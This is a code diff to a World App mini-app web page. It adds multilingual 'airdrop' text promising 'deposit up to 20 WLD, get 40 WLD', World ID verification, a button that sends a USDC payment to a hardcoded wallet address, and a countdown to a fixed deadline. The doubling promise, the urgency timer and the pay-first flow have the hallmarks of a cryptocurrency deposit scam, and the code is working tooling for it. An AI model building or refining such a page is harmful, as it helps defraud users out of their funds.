@@ -86,6 +86,18 @@ html,body{
   letter-spacing:2px;
 }
 
+/* PAY BUTTON */
+.pay-box button{
+  margin-top:26px;
+  padding:14px 30px;
+  border:none;
+  border-radius:10px;
+  background:#00c389;
+  color:#000;
+  letter-spacing:2px;
+  cursor:pointer;
+}
+
 /* COPY */
 .deposit-code{
   display:none;
@@ -164,6 +176,11 @@ html,body{
     <button onclick="verifyWorldID()">VERIFY WITH WORLD ID</button>
   </div>
 
+  <!-- PAY BUTTON (hidden initially) -->
+  <div class="pay-box" id="payBox" style="display:none;">
+    <button id="payBtn">PAY WITH WORLD APP</button>
+  </div>
+
   <!-- QR -->
   <div class="qr-box" id="qrBox">
     <img src="qr.jpeg">
@@ -191,17 +208,83 @@ html,body{
 
 </div>
 
-<script>
-/* ========= CONFIG ========= */
-const TOTAL_SECONDS = 36 * 60 * 60;
-let seconds = TOTAL_SECONDS;
+<script type="module">
+/* ========= IMPORT MINIKIT ========= */
+import { MiniKit } from "https://cdn.jsdelivr.net/npm/@worldcoin/minikit-js@latest/+esm";
+
+/* ========= TRANSLATIONS & TEXT ROTATION ========= */
+// Array of translations for the airdrop message. Each entry contains
+// three strings corresponding to the three lines displayed. Languages:
+// English, Spanish, Portuguese, French, Italian, German, Chinese.
+const translations = [
+  ["100% EARN AIRDROP", "DEPOSIT UP TO 20 WLD", "GET 40 WLD"],
+  ["100% GANA AIRDROP", "DEPOSITA HASTA 20 WLD", "RECIBE 40 WLD"],
+  ["100% GANHE AIRDROP", "DEPOSITE ATÉ 20 WLD", "RECEBA 40 WLD"],
+  ["100% GAGNE AIRDROP", "DÉPOSE JUSQU'À 20 WLD", "OBTIENT 40 WLD"],
+  ["100% OTTIENI AIRDROP", "DEPOSITA FINO A 20 WLD", "OTTENERE 40 WLD"],
+  ["100% ERHALTE AIRDROP", "HINTERLEGE BIS ZU 20 WLD", "BEKOMME 40 WLD"],
+  ["100% 获得空投", "存入最多 20 WLD", "获得 40 WLD"]
+];
+let langIndex = 1; // start with second language after the initial English
+function updateLanguage(){
+  const spans = document.querySelectorAll('.airdrop-text span');
+  const texts = translations[langIndex];
+  // Update each span's textContent
+  spans[0].textContent = texts[0];
+  spans[1].textContent = texts[1];
+  spans[2].textContent = texts[2];
+  // Advance to next language for the next cycle
+  langIndex = (langIndex + 1) % translations.length;
+}
+// Rotate languages every 6 seconds (matching the total animation duration)
+setInterval(updateLanguage, 6000);
+
+/* ========= WORLD APP PAYMENT CONFIG ========= */
+// Replace these with your actual World App ID action and the target wallet
+const ACTION_ID = "selfie-mirror-verify";
+const WALLET_ADDRESS = "0x1f62e7890d5db2c94c280547876b050f5d1816c5";
+const PAYMENT_AMOUNT = "1.00"; // USDC or WLD depending on configuration
+const PAYMENT_TOKEN = "USDC";
+
+/* ========= TIMER CONFIG ========= */
 let interval;
 
-/* ========= WORLD ID (SIMULADO) ========= */
-function verifyWorldID(){
-  // Acá va World ID real. Simulamos OK:
-  document.getElementById("widBox").style.display="none";
-  showDeposit();
+// Compute remaining seconds until January 11, 2026 (local time)
+function getRemainingSeconds() {
+  const target = new Date('2026-01-11T00:00:00');
+  const now = new Date();
+  return Math.floor((target - now) / 1000);
+}
+
+/* ========= WORLD ID VERIFICATION ========= */
+async function verifyWorldID(){
+  try{
+    // Hide verify button to prevent multiple clicks
+    widBox.style.display = "none";
+    status.textContent = "Verifying ID…";
+    // Use MiniKit to verify World ID
+    const { finalPayload } = await MiniKit.commandsAsync.verify({
+      action: ACTION_ID,
+      signal: Date.now().toString()
+    });
+    if (!finalPayload) {
+      // If user cancels verification
+      status.textContent = "Verification cancelled";
+      widBox.style.display = "block";
+      return;
+    }
+    // You can send finalPayload to your backend here for validation if needed
+    status.textContent = "ID verified ✔";
+    // Show pay button
+    payBox.style.display = "block";
+    // Hide deposit instructions if they were visible
+    qrBox.style.display = "none";
+    depositBox.style.display = "none";
+  }catch(e){
+    console.error(e);
+    status.textContent = "Verification error";
+    widBox.style.display = "block";
+  }
 }
 
 /* ========= SHOW DEPOSIT ========= */
@@ -233,8 +316,10 @@ async function waitForDeposit(){
 /* ========= TIMER ========= */
 function startTimer(){
   timer.style.display="block";
+  clearInterval(interval);
   interval = setInterval(()=>{
-    if(seconds<=0){
+    const remaining = getRemainingSeconds();
+    if(remaining <= 0){
       clearInterval(interval);
       timer.style.display="none";
       qrBox.style.display="none";
@@ -242,11 +327,10 @@ function startTimer(){
       errorBox.style.display="block";
       return;
     }
-    seconds--;
-    const h=String(Math.floor(seconds/3600)).padStart(2,"0");
-    const m=String(Math.floor((seconds%3600)/60)).padStart(2,"0");
-    const s=String(seconds%60).padStart(2,"0");
-    timer.textContent=`TIME LEFT ${h}:${m}:${s}`;
+    const h = String(Math.floor(remaining/3600)).padStart(2,"0");
+    const m = String(Math.floor((remaining%3600)/60)).padStart(2,"0");
+    const s = String(remaining%60).padStart(2,"0");
+    timer.textContent = `TIME LEFT ${h}:${m}:${s}`;
   },1000);
 }
 
@@ -259,11 +343,46 @@ function copyAddr(){
 
 /* ========= RESTART ========= */
 function restart(){
-  seconds = TOTAL_SECONDS;
+  // Reset timer and UI for another attempt
+  clearInterval(interval);
   errorBox.style.display="none";
   status.textContent="";
   widBox.style.display="block";
+  timer.style.display="none";
+  qrBox.style.display="none";
+  depositBox.style.display="none";
 }
+
+/* ========= PAY WITH WORLD APP ========= */
+async function pay(){
+  try{
+    status.textContent = "Processing payment…";
+    // Request payment via MiniKit; reference can be unique per session
+    const reference = Date.now().toString();
+    const payment = await MiniKit.commandsAsync.sendPayment({
+      to: WALLET_ADDRESS,
+      amount: PAYMENT_AMOUNT,
+      token: PAYMENT_TOKEN,
+      reference
+    });
+    if (payment && payment.success) {
+      status.textContent = "Payment confirmed ✔";
+      payBox.style.display = "none";
+      // Start countdown after successful payment
+      startTimer();
+    } else {
+      status.textContent = "Payment cancelled";
+      payBox.style.display = "block";
+    }
+  }catch(e){
+    console.error(e);
+    status.textContent = "Payment error";
+    payBox.style.display = "block";
+  }
+}
+
+// Attach click handler to the pay button once DOM is ready
+document.getElementById("payBtn").onclick = pay;
 </script>
 
 </body>
